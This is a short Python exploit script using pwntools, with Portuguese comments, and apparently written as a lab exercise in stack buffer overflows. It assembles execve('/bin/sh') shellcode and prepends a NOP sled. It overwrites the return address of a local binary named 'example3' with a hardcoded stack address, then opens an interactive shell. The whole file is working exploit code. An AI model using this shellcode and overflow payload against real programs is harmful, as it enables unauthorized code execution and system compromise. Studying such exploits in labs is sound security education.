#!/usr/bin/python3


#pip3 install pwntools
from pwn import *

#diz o tipo do processador que estamos usando
context.clear(arch='amd64')

shellcode = asm ("""
mov rax , 0x0068732f6e69622f
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,59
syscall
""")
print("shellcode gerado",shellcode)


#cria um processo e se conecta a ele
p = process("example3")

#cria um payload para enviar. 16 A's para o buffer, 8 A's para o rbp salvo na pilha e um ponteiro para o endereço desejado

tamanhoTotal=32+8

payload = b"\x90"*(tamanhoTotal-len(shellcode)) + shellcode + p64(0x7fffffffe280)
#na minha maquina 0x7fffffffe280 funciona mas na sua nao, as nossas variaveis de ambiente são diferentes e isso afeta o endereço na pilha




#pode ser usado para debugar antes de enviar o payload, ex gdb --pid 796
input(">")

#envia o payload para o programa
p.sendline(payload)





#permite interagir com o programa em execução quando obter um shell
p.interactive()
